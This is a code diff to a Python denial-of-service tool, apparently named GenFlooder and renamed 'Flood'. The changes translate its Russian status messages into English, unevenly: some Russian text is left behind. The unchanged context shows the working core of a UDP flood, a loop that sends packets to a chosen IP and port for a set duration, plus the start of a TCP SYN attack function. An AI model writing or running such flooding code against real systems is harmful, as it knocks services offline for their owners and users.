@@ -47,7 +47,7 @@ def check_target_availability(target_ip, target_port):
         print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
         return True
     except socket.error:
-        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Цель недоступна: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
+        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
         return False
 
 def udp_attack(target_ip, target_port, duration): 
@@ -57,13 +57,13 @@ def udp_attack(target_ip, target_port, duration):
     end_time = time.time() + duration
     packets_sent = 0
 
-    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Начата UDP-атака на {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}секунд.')
+    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP attack has been launched on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.')
 
     while time.time() < end_time:
         udp_socket.sendto(packet_data, (target_ip, target_port))
         packets_sent += 1
     
-    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP-атака завершена. Всего отправлено пакетов: {Fore.LIGHTGREEN_EX}{packets_sent}')
+    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}Flood {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP-атака завершена. Всего отправлено пакетов: {Fore.LIGHTGREEN_EX}{packets_sent}')
 
 def tcp_syn_attack(target_ip, target_port, duration): #Инициирует TCP SYN-атаку на указанную цель.
     end_time = time.time() + duration
